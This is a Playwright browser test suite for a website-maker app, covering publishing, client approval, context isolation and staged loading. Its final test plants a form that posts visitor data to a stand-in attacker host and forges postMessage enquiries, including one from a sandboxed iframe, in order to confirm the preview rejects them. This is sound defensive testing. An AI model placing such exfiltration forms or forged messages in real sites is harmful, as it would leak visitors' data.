import { test, expect } from "@playwright/test";

const baseURL = process.env.SITE_URL || "http://127.0.0.1:8888";

async function reset(page) {
    await page.goto(`${baseURL}/index.html`, { waitUntil: "domcontentloaded" });
    await page.evaluate(() => { localStorage.clear(); sessionStorage.clear(); });
    await page.reload({ waitUntil: "domcontentloaded" });
}

async function completeBrief(page) {
    const steps = [
        ["#outcome-name-input", "Northstar Studio"],
        ["#outcome-offer-input", "Website design"],
        ["#outcome-audience-input", "Local business owners"],
        ["#outcome-location-input", "Austin, Texas"]
    ];
    for (const [selector, value] of steps) {
        await page.locator(selector).fill(value);
        await page.locator("#apply-outcome-brief-btn").click();
    }
    await page.locator("#outcome-goal-select").selectOption("quote");
    await page.locator("#apply-outcome-brief-btn").click();
    await page.locator("#outcome-proof-input").fill("Senior specialists and clear communication");
    await page.locator("#apply-outcome-brief-btn").click();
    await expect.poll(() => page.evaluate(() => window.websiteMakerWorkflow?.getState?.().state), { timeout: 30_000 }).toBe("draft");
}

async function completeContact(page) {
    await page.locator("#outcome-phone-input").fill("+1 555 123 4567 ext 9");
    await page.locator("#outcome-email-input").fill("hello@example.com");
    await page.locator("#outcome-hours-input").fill("By appointment");
    await page.locator("#update-contact-draft-btn").click();
}

async function recordVerifiedDeployment(page, url = "https://northstar.example/") {
    await expect.poll(() => page.evaluate(() => window.websiteMakerStageLoader?.loaded?.("draft"))).toBe(true);
    await page.locator("#published-site-url-input").fill(url);
    await page.locator("#published-site-url-input").dispatchEvent("input");
    await page.evaluate((deploymentUrl) => {
        document.dispatchEvent(new CustomEvent("workspace:deployment-complete", {
            detail: {
                id: "deployment-browser-test",
                state: "published",
                url: deploymentUrl,
                revision: window.workspaceAPI.getState().revision
            }
        }));
    }, url);
    await expect.poll(() => page.evaluate(() => window.websiteMakerWorkflow.getState().state)).toBe("published");
    await page.waitForTimeout(350);
    await page.evaluate(() => {
        const saved = localStorage.getItem("luxury-engine-workspace");
        if (saved) localStorage.setItem(window.workspaceContext.storageKey("luxury-engine-workspace"), saved);
    });
}

test.describe("website maker owner and client journeys", () => {
    test("core startup has no uncaught errors or failed same-origin resources", async ({ page }) => {
        const pageErrors = [];
        const consoleErrors = [];
        const failedRequests = [];
        page.on("pageerror", (error) => pageErrors.push(error.message));
        page.on("console", (message) => { if (message.type() === "error") consoleErrors.push(message.text()); });
        page.on("requestfailed", (request) => {
            if (new URL(request.url()).origin === new URL(baseURL).origin) failedRequests.push(`${request.method()} ${request.url()} — ${request.failure()?.errorText || "failed"}`);
        });
        await reset(page);
        await expect.poll(() => page.evaluate(() => document.documentElement.dataset.loaderState), { timeout: 30_000 }).toBe("ready");
        await page.waitForTimeout(250);
        expect(pageErrors).toEqual([]);
        expect(consoleErrors).toEqual([]);
        expect(failedRequests).toEqual([]);
        const diagnostics = await page.evaluate(() => window.workspaceStartupDiagnostics);
        expect(diagnostics.diagnosticsAvailable).toBe(true);
        expect(diagnostics.initialScriptCount).toBeGreaterThan(0);
        expect(diagnostics.transferredScriptBytes).toBeGreaterThan(0);
    });

    test("canonical profile generates a site before Advanced tools are mounted", async ({ page }) => {
        await reset(page);
        await expect(page.locator("#input-biz-address")).toHaveCount(0);
        const result = await page.evaluate(() => {
            window.websiteMakerProfileStore.update({
                identity: { displayName: "Profile-only Studio", email: "hello@profile-only.example" },
                services: ["Conversion design"],
                locations: [{ city: "Portland", address: "" }],
                audience: "Independent businesses",
                primaryGoal: "quote",
                differentiator: "Evidence-led delivery",
                availability: "By appointment",
                messaging: { hook: "Turn visits into qualified enquiries", cta: "Request a quote" }
            }, { source: "profile-only-test" });
            const files = window.workspaceGenerator.createProject();
            return { html: files["index.html"], advancedMounted: Boolean(document.getElementById("input-biz-address")) };
        });
        expect(result.advancedMounted).toBe(false);
        expect(result.html).toContain("Profile-only Studio");
        expect(result.html).toContain("Conversion design");
        expect(result.html).toContain("Independent businesses");
    });

    test("owner reaches the publish or download decision and survives refresh", async ({ page }) => {
        await reset(page);
        await completeBrief(page);
        await completeContact(page);
        await expect(page.locator("#website-maker-next-action")).toHaveText(/Publish website|Download website files/);
        await page.reload({ waitUntil: "domcontentloaded" });
        await expect.poll(() => page.evaluate(() => window.websiteMakerWorkflow?.getState?.().state)).toMatch(/draft|review|approved|published/);
        await expect(page.locator("#preview-frame-shell")).toBeVisible();
    });

    test("verified publication and live URL survive refresh", async ({ page }) => {
        await reset(page);
        await completeBrief(page);
        await completeContact(page);
        await recordVerifiedDeployment(page);

        await expect(page.locator("#website-maker-next-action")).toHaveText("Open live website");
        await expect(page.locator("#go-live-url-link")).toHaveAttribute("href", "https://northstar.example/");
        await page.reload({ waitUntil: "domcontentloaded" });

        await expect.poll(() => page.evaluate(() => window.websiteMakerWorkflow?.getState?.().state)).toBe("published");
        await expect(page.locator("#website-maker-next-action")).toHaveText("Open live website");
        await expect(page.locator("#published-site-url-input")).toHaveValue("https://northstar.example/");
    });

    for (const evidence of [
        { name: "a stale deployment revision", patch: { deploymentRevision: "stale-revision" } },
        { name: "missing deployment verification", patch: { deploymentVerified: false } },
        { name: "an invalid deployment URL", patch: { deploymentUrl: "http://northstar.example/" } }
    ]) {
        test(`published state safely downgrades after refresh with ${evidence.name}`, async ({ page }) => {
            await reset(page);
            await completeBrief(page);
            await completeContact(page);
            await recordVerifiedDeployment(page);
            await page.evaluate((patch) => {
                const key = window.workspaceContext.storageKey("omniscript-maker-workflow-v2");
                const saved = JSON.parse(sessionStorage.getItem(key));
                sessionStorage.setItem(key, JSON.stringify({ ...saved, ...patch }));
            }, evidence.patch);
            await page.reload({ waitUntil: "domcontentloaded" });

            await expect.poll(() => page.evaluate(() => window.websiteMakerWorkflow?.getState?.().state)).toBe("draft");
            await expect(page.locator("#website-maker-next-action")).toHaveText(/Publish website|Download website files/);
            await expect(page.locator("#website-maker-next-action")).not.toHaveText("Open live website");
        });
    }

    test("client approval is revision-bound and restored", async ({ page }) => {
        await reset(page);
        await completeBrief(page);
        await completeContact(page);
        await page.evaluate(() => window.websiteMakerWorkflow.setProjectType("client"));
        await expect(page.locator("#website-maker-next-action")).toHaveText("Create review link");
        await page.evaluate(() => {
            const revision = window.workspaceAPI?.getState?.().revision || "draft";
            window.websiteMakerWorkflow.transition("approved", { source: "client-review", approvedRevision: revision });
        });
        await expect(page.locator("#website-maker-next-action")).toHaveText(/Publish website|Download website files/);
        await page.reload({ waitUntil: "domcontentloaded" });
        await expect.poll(() => page.evaluate(() => window.websiteMakerWorkflow?.getState?.().reviewStatus)).toBe("approved");
        await expect(page.locator("#website-maker-next-action")).toHaveText(/Publish website|Download website files/);
    });

    test("editing approved output invalidates approval now and after refresh", async ({ page }) => {
        await reset(page);
        await completeBrief(page);
        await completeContact(page);
        await page.evaluate(() => {
            window.websiteMakerWorkflow.setProjectType("client");
            const revision = window.workspaceAPI.getState().revision;
            window.websiteMakerWorkflow.transition("approved", { source: "client-review", approvedRevision: revision });
        });
        await expect.poll(() => page.evaluate(() => window.websiteMakerWorkflow.getState().reviewStatus)).toBe("approved");

        await page.evaluate(() => {
            const state = window.workspaceAPI.getState();
            window.workspaceAPI.applySnapshot({
                ...state,
                files: { ...state.files, "index.html": `${state.files["index.html"]}\n<!-- revised -->` }
            }, { dirty: true });
        });

        await expect.poll(() => page.evaluate(() => window.websiteMakerWorkflow.getState().reviewStatus)).toBe("draft");
        await expect(page.locator("#website-maker-next-action")).toHaveText("Create review link");
        await page.reload({ waitUntil: "domcontentloaded" });
        await expect.poll(() => page.evaluate(() => window.websiteMakerWorkflow.getState().reviewStatus)).toBe("draft");
        await expect(page.locator("#website-maker-next-action")).toHaveText("Create review link");
    });

    test("refresh during generation recovers to the brief without inventing a draft", async ({ page }) => {
        await reset(page);
        await page.evaluate(() => {
            const key = window.workspaceContext.storageKey("omniscript-maker-workflow-v2");
            sessionStorage.setItem(key, JSON.stringify({ state: "generating", projectType: "owner", reviewStatus: "draft", updatedAt: new Date().toISOString() }));
        });
        await page.reload({ waitUntil: "domcontentloaded" });
        await expect.poll(() => page.evaluate(() => window.websiteMakerWorkflow?.getState?.().state)).toBe("brief");
        await expect(page.locator("#publish-confidence-status")).toContainText("interrupted");
    });

    test("advanced controls mount once and keyboard focus returns to the toggle", async ({ page }) => {
        await reset(page);
        await completeBrief(page);
        const toggle = page.locator("#show-advanced-tools-btn");
        await toggle.focus();
        await toggle.press("Enter");
        await expect(page.locator("#input-biz-address")).toHaveCount(1);
        await page.locator("#input-biz-address").fill("1 Main Street");
        await toggle.click({ force: true });
        await expect(toggle).toBeFocused();
        await toggle.press("Enter");
        await expect(page.locator("#input-biz-address")).toHaveCount(1);
        await expect(page.locator("#input-biz-address")).toHaveValue("1 Main Street");
    });

    test("two client contexts keep profiles, generated files, and approval evidence isolated", async ({ page }) => {
        await reset(page);
        await page.evaluate(() => {
            const clients = [
                { id: "client-alpha", mode: "client", name: "Alpha", projectName: "Alpha site", permissionsConfirmed: true, assetRightsConfirmed: true },
                { id: "client-beta", mode: "client", name: "Beta", projectName: "Beta site", permissionsConfirmed: true, assetRightsConfirmed: true }
            ];
            localStorage.setItem("omniscript-operating-mode-v1", JSON.stringify({ version: 1, mode: "client", selectedAt: new Date().toISOString(), source: "test" }));
            localStorage.setItem("morrow-work-contexts-v1", JSON.stringify(clients));
            for (const client of clients) {
                const scope = `client:${client.id}`;
                const name = client.id === "client-alpha" ? "Alpha Studio" : "Beta Works";
                const html = `<!doctype html><html lang="en"><head><title>${name}</title></head><body><h1>${name}</h1></body></html>`;
                localStorage.setItem(`morrow-business-profile-v1::${scope}`, JSON.stringify({ version: 2, revision: 1, savedAt: "2026-01-01T00:00:00.000Z", profile: { identity: { displayName: name, phoneDisplay: "+1 555 123 4567", phoneDial: "+15551234567", email: `hello@${client.id}.example` }, services: ["Design"], locations: [{ city: "Austin" }], availability: "By appointment" } }));
                localStorage.setItem(`luxury-engine-workspace::${scope}`, JSON.stringify({ schemaVersion: 1, files: { "index.html": html, "style.css": "", "script.js": "" }, activePage: "index.html", previewMode: "desktop", projectName: `${name} project` }));
                sessionStorage.setItem(`omniscript-maker-workflow-v2::${scope}`, JSON.stringify({ state: client.id === "client-alpha" ? "approved" : "draft", projectType: "client", reviewStatus: client.id === "client-alpha" ? "approved" : "draft", approvedRevision: client.id === "client-alpha" ? "pending" : "", updatedAt: new Date().toISOString() }));
            }
            localStorage.setItem("morrow-active-work-context-v1", JSON.stringify({ client: "client-alpha" }));
        });

        await page.reload({ waitUntil: "domcontentloaded" });
        await expect.poll(() => page.evaluate(() => window.workspaceContext?.current?.()?.id)).toBe("client-alpha");
        await expect.poll(() => page.evaluate(() => window.websiteMakerProfileStore?.getState?.().identity.displayName)).toBe("Alpha Studio");
        await page.evaluate(() => {
            const revision = window.workspaceAPI.getState().revision;
            window.websiteMakerWorkflow.transition("approved", { source: "client-review", approvedRevision: revision });
        });
        await expect.poll(() => page.evaluate(() => window.websiteMakerWorkflow.getState().reviewStatus)).toBe("approved");
        await recordVerifiedDeployment(page, "https://alpha.example/");

        for (const [id, expectedName, expectedReview, expectedState, expectedAction] of [
            ["client-beta", "Beta Works", "draft", "draft", "Create review link"],
            ["client-alpha", "Alpha Studio", "approved", "published", "Open live website"],
            ["client-beta", "Beta Works", "draft", "draft", "Create review link"],
            ["client-alpha", "Alpha Studio", "approved", "published", "Open live website"]
        ]) {
            await page.evaluate((client) => localStorage.setItem("morrow-active-work-context-v1", JSON.stringify({ client })), id);
            await page.reload({ waitUntil: "domcontentloaded" });
            await expect.poll(() => page.evaluate(() => window.workspaceContext?.current?.()?.id)).toBe(id);
            await expect.poll(() => page.evaluate(() => window.websiteMakerProfileStore?.getState?.().identity.displayName)).toBe(expectedName);
            await expect.poll(() => page.evaluate(() => window.workspaceAPI?.getState?.().files["index.html"] || "")).toContain(expectedName);
            await expect.poll(() => page.evaluate(() => window.websiteMakerWorkflow?.getState?.().reviewStatus)).toBe(expectedReview);
            await expect.poll(() => page.evaluate(() => window.websiteMakerWorkflow?.getState?.().state)).toBe(expectedState);
            await expect(page.locator("#website-maker-next-action")).toHaveText(expectedAction);
        }
    });

    test("advanced stage failure offers one retry and preserves mounted values", async ({ page }) => {
        await reset(page);
        await completeBrief(page);
        let attempts = 0;
        await page.route("**/workspace-schema.js", async (route) => {
            attempts += 1;
            if (attempts === 1) await route.abort();
            else await route.continue();
        });
        const toggle = page.locator("#show-advanced-tools-btn");
        await toggle.click();
        await page.locator("#input-biz-address").fill("Preserved after retry");
        const retry = page.locator("[data-retry-advanced]");
        await expect(retry).toBeVisible();
        await expect(retry).toBeFocused();
        await retry.click();
        await expect.poll(() => page.evaluate(() => window.websiteMakerStageLoader?.loaded?.("advanced"))).toBe(true);
        await expect(page.locator("[data-retry-advanced]")).toHaveCount(0);
        await expect(page.locator("#input-biz-address")).toHaveCount(1);
        await expect(page.locator("#input-biz-address")).toHaveValue("Preserved after retry");
        expect(await page.locator('script[src$="workspace-schema.js"]').count()).toBe(1);
    });

    test("deferred stages stay out of initial execution and load only once", async ({ page }) => {
        await reset(page);
        const deferredSources = ["website-maker-contact.js", "website-maker-publishing.js", "enquiry-loop.js", "review-handoff.js", "website-maker-advanced-template.js", "workspace-schema.js", "platform-ui.js"];
        for (const source of deferredSources) {
            await expect(page.locator(`script[src$="${source}"]`)).toHaveCount(0);
        }
        const prematureRequests = await page.evaluate((sources) => performance.getEntriesByType("resource")
            .map((entry) => entry.name)
            .filter((name) => sources.some((source) => name.endsWith(`/${source}`))), deferredSources);
        expect(prematureRequests).toEqual([]);
        await expect(page.locator("#advanced-workspace-tools-template, #input-biz-address")).toHaveCount(0);
        await expect.poll(() => page.evaluate(() => window.workspaceStartupDiagnostics?.initialScriptCount || 0)).toBeGreaterThan(0);
        const diagnostics = await page.evaluate(() => window.workspaceStartupDiagnostics);
        expect(diagnostics.budgets).toBeTruthy();
        expect(diagnostics.initialScriptCount).toBeLessThanOrEqual(diagnostics.budgets.initialScriptCount);
        expect(diagnostics.transferredScriptBytes).toBeLessThanOrEqual(diagnostics.budgets.transferredScriptBytes);
        expect(diagnostics.cumulativeLayoutShift).toBeLessThanOrEqual(diagnostics.budgets.cumulativeLayoutShift);
        expect(diagnostics.diagnosticsAvailable).toBe(true);
        expect(diagnostics.budgetResults).toEqual({ diagnosticsAvailable: true, initialScriptCount: true, transferredScriptBytes: true, stagedScriptCount: true, stagedExecutionCount: true, cumulativeLayoutShift: true });
        expect(diagnostics.staged).toEqual({ draft: false, advanced: false });

        await completeBrief(page);
        await expect.poll(() => page.locator('script[src$="website-maker-contact.js"]').count()).toBe(1);
        await page.locator("#show-advanced-tools-btn").click();
        await expect.poll(() => page.locator('script[src$="website-maker-advanced-template.js"]').count()).toBe(1);
        await expect.poll(() => page.locator('script[src$="workspace-schema.js"]').count()).toBe(1);
        await expect.poll(() => page.locator('script[src$="platform-ui.js"]').count()).toBe(1);
        await page.locator("#show-advanced-tools-btn").click();
        await page.locator("#show-advanced-tools-btn").click();
        await expect(page.locator('script[src$="workspace-schema.js"]')).toHaveCount(1);
        const stagedCount = await page.evaluate(() => window.websiteMakerStageLoader.loadedScriptCount());
        const stagedBudget = await page.evaluate(() => window.workspaceStartupDiagnostics.budgets.stagedScriptCount);
        const executionCounts = await page.evaluate(() => window.websiteMakerStageLoader.executionCounts());
        const interactionDiagnostics = await page.evaluate(() => window.refreshWorkspaceStartupDiagnostics("advanced-interaction"));
        expect(stagedCount).toBeLessThanOrEqual(stagedBudget);
        expect(Object.values(executionCounts).every((count) => count === 1)).toBe(true);
        expect(interactionDiagnostics.phase).toBe("advanced-interaction");
        expect(interactionDiagnostics.budgetResults.stagedExecutionCount).toBe(true);
        expect(interactionDiagnostics.budgetResults.cumulativeLayoutShift).toBe(true);
    });

    test("brief coordinator compiles canonical profile data without mounting Advanced tools", async ({ page }) => {
        await reset(page);
        const originalProfile = await page.evaluate(() => {
            const profile = window.websiteMakerProfileStore.getState();
            profile.brand.gallery.push("caller-only-mutation");
            return window.websiteMakerProfileStore.getState();
        });
        expect(originalProfile.brand.gallery).not.toContain("caller-only-mutation");
        await completeBrief(page);
        const result = await page.evaluate(() => ({
            html: window.workspaceAPI.getState().files["index.html"],
            profile: window.websiteMakerProfileStore.getState(),
            advancedMounted: Boolean(document.getElementById("input-biz-address")),
            workflow: window.websiteMakerWorkflow.getState().state
        }));
        expect(result.workflow).toBe("draft");
        expect(result.advancedMounted).toBe(false);
        expect(result.profile.identity.displayName).toBe("Northstar Studio");
        expect(result.html).toContain("Northstar Studio");
        expect(result.html).toContain("Website design");
    });

    test("browser AI fallback and focused regeneration preserve the canonical nested profile", async ({ page }) => {
        await reset(page);
        await completeBrief(page);
        await page.route("**/api/website-architect", async (route) => route.fulfill({ status: 503, contentType: "application/json", body: JSON.stringify({ error: "AI unavailable" }) }));
        const result = await page.evaluate(async () => {
            window.websiteMakerProfileStore.update({ brand: { gallery: ["https://example.com/original.jpg"], galleryAlt: ["Original"] } }, { source: "immutability-test" });
            const before = window.websiteMakerProfileStore.getState();
            const ai = await window.workspaceGenerator.createAIProject({ business: { name: "Caller override" } });
            const regenerated = window.workspaceGenerator.regenerateProject({}, { mode: "design", preserveCopy: true, lockAssets: true });
            const after = window.websiteMakerProfileStore.getState();
            return {
                provider: ai.provider,
                aiHtml: ai.files["index.html"],
                regeneratedHtml: regenerated["index.html"],
                unchanged: JSON.stringify(before) === JSON.stringify(after),
                gallery: after.brand.gallery
            };
        });
        expect(result.provider).toBe("deterministic");
        expect(result.aiHtml).toContain("Northstar Studio");
        expect(result.aiHtml).not.toContain("Caller override");
        expect(result.regeneratedHtml).toContain("Northstar Studio");
        expect(result.unchanged).toBe(true);
        expect(result.gallery).toEqual(["https://example.com/original.jpg"]);
    });

    test("failed repair leaves the current workspace files unchanged", async ({ page }) => {
        await reset(page);
        await completeBrief(page);
        const result = await page.evaluate(async () => {
            const before = window.workspaceAPI.getState();
            let rejected = false;
            try {
                await window.workspaceGenerator.repairAIProject(before.files, [{ message: "test" }], {}, { fallback: false });
            } catch (_) {
                rejected = true;
            }
            const after = window.workspaceAPI.getState();
            return { rejected, sameFiles: JSON.stringify(before.files) === JSON.stringify(after.files), sameRevision: before.revision === after.revision };
        });
        expect(result).toEqual({ rejected: true, sameFiles: true, sameRevision: true });
    });

    test("preview rejects forged messages and blocks external form navigation", async ({ page }) => {
        await reset(page);
        await completeBrief(page);
        await expect.poll(() => page.evaluate(() => window.websiteMakerStageLoader?.loaded?.("draft"))).toBe(true);
        let externalRequests = 0;
        await page.route("https://evil.example/**", async (route) => { externalRequests += 1; await route.abort(); });
        await expect.poll(() => page.evaluate(() => Boolean(window.workspaceAPI))).toBe(true);
        await page.evaluate(() => {
            const state = window.workspaceAPI.getState();
            window.workspaceAPI.applySnapshot({
                ...state,
                files: {
                    ...state.files,
                    "index.html": '<!doctype html><html lang="en"><head><title>Secure preview</title></head><body><h1>Secure preview</h1><form action="https://evil.example/collect"><label>Name<input name="name" value="Visitor"></label><button type="submit">Send</button><output></output></form></body></html>',
                    "style.css": "",
                    "script.js": ""
                }
            }, { dirty: true });
        });
        const before = await page.evaluate(() => ({
            leads: localStorage.getItem("morrow-lead-inbox-v1"),
            workflow: window.websiteMakerWorkflow.getState(),
            toast: document.getElementById("enquiry-toast").hidden,
            href: location.href
        }));
        await page.evaluate(() => {
            const messages = [
                { channel: "website-maker-preview-v1", type: "unknown", payload: { email: "forged@example.com" } },
                { channel: "website-maker-preview-v1", type: "enquiry", payload: { email: "forged@example.com", admin: true } },
                { channel: "website-maker-preview-v1", type: "enquiry", payload: { message: "x".repeat(5000) } },
                { channel: "website-maker-preview-v1", type: "error", payload: { message: "x".repeat(1001) } }
            ];
            messages.forEach((data) => window.dispatchEvent(new MessageEvent("message", { data, source: window, origin: location.origin })));
        });
        const attacker = await page.locator("body").evaluate((body) => {
            const frame = document.createElement("iframe");
            frame.sandbox = "allow-scripts";
            frame.srcdoc = '<script>parent.postMessage({ channel: "website-maker-preview-v1", type: "enquiry", payload: { email: "wrong-origin@example.com" } }, "*")<\/script>';
            frame.hidden = true;
            body.append(frame);
            return true;
        });
        expect(attacker).toBe(true);
        await page.waitForTimeout(50);
        const afterRejected = await page.evaluate(() => ({
            leads: localStorage.getItem("morrow-lead-inbox-v1"),
            workflow: window.websiteMakerWorkflow.getState(),
            toast: document.getElementById("enquiry-toast").hidden,
            href: location.href
        }));
        expect(afterRejected).toEqual(before);
        const frame = page.frameLocator("#previewContentIframe");
        await expect(frame.locator("h1")).toHaveText("Secure preview");
        await frame.locator('button[type="submit"]').click();
        await expect.poll(() => page.evaluate(() => document.body.dataset.enquiryReady)).toBe("true");
        expect(externalRequests).toBe(0);
        const leads = await page.evaluate(() => JSON.parse(localStorage.getItem("morrow-lead-inbox-v1") || "[]"));
        expect(leads.some((lead) => lead.email === "forged@example.com")).toBe(false);
        expect(leads.some((lead) => lead.name === "Visitor")).toBe(true);
    });
});
